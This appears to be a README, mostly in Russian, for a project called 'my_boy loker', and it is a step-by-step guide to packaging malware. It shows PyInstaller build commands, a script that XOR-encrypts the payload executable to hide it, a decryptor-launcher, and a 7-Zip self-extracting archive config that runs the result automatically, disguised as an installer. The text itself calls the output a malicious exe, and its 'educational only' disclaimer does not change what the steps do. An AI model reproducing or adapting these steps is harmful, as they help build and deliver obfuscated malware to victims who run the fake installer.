# my_boy loker 

__DISCLAIMER: This software is for educational purposes only. This software should not be used for illegal activity. The author is not responsible for its use.__

__ОТКАЗ ОТ ОТВЕТСТВЕННОСТИ: Это программное обеспечение предназначено только для образовательных целей. Это программное обеспечение не должно использоваться для незаконной деятельности. Автор не несет ответственности за его использование.__

## Процесс создания конечного экзешника

1. Для начала нужно создать .exe полезной нагрузки в файле `main.pyw`, создается он выполнением сборщика(в IDE PyCharm я просто выделял эту область и нажимал выполнить выделенное в консоле)
  ```
  import os
  os.system("pyinstaller --onefile -w main.pyw")
  ```
2. После получения экзешника с полезной нагрузкой, переходим к файлу `cipher.pyw`. На данном шаге, этот файл будет выполнять функцию получения шифрованной полезной нагрузки методом XOR. В абсолютном пути к файлу следуюет указать `\\` для правильной интрепритации строки, либо использовать префекс `r''` перед строкой и использовать одиночный слеш.
  ```
  xorKey = 'P'

  # # # Coding
  f = open('C:\\Users\\starw\\PycharmProjects\\locker\\dist\\main.exe', 'rb')

  s = ''
  for i in f:
      s += i.decode('iso-8859-1')

  ss = ''
  for j in s:
      xbyte = chr(ord(j) ^ ord(xorKey))
      ss += xbyte


  with open("examp3.exe", "wb") as f:
      f.write(ss.encode('iso-8859-1'))
  ```
  Примечание, в строке с `decode` идет перевод байтов из кодировки `iso-8859-1` в символьный вид. Функция `ord` требуется для возврата числового значения символа, представляющее его позицию в юникод.
  
3. После создания вредоносного exe. Файл `cipher.pyw` начинает выполнять другую функцию - а именно дешефратор и исполнитель вредоносного кода. На этом этапе следует закоментить часть кода из пункта `2` и запустить сборку .exe исполнением следующего кода

  ```
  import os

  os.system("pyinstaller --onefile -w cipher.pyw")
  ```
4. На этом этапе есть два .exe файла, один `examp3.exe` с зашифрованной полезной нагрузкой и `main.exe` с дешефратором и расшифрованной полезной нагрузки запуском `examp_d3.exe`. Нужно объеденить их в один exe. Для этого буду использовать 7-zip File Manager c функцией SFX архив(самораспаковывающийся архив). Но одной распоковки мало, требуется чтобы после выполнения распоковки выполнялся запуск `главной` программы.
  
  Закидываем в одну папку  `examp_d3.exe` и  `main.exe`. Создаем текстовый файл `config.txt` в котором пишем следующее
  ```
  ;!@Install@!UTF-8!
  Title=" "
  RunProgram=" "
  ;!@InstallEnd@!
  ```
  В `Title` пишем свое название, `RunProgram` пишем  `main.exe`
  
  Так же следует скачать `LZMA SDK` и закинуть в папку файл `7zSD.sfx` 
  
  С помощью 7-zip создаю самораспаковывающийся архив, в который входят `examp3.exe` и  `main.exe`
  
5. Заходим в CMD, заходим в папку с файлами, и пишем
  `copy /b 7zSD.sfx + config.txt + SFX_архив название_инсталятора.exe`
  
[Гайд на форуме по создаю автозапуска после самораспаковки](https://superuser.com/questions/42788/is-it-possible-to-execute-a-file-after-extraction-from-a-7-zip-self-extracting-a)
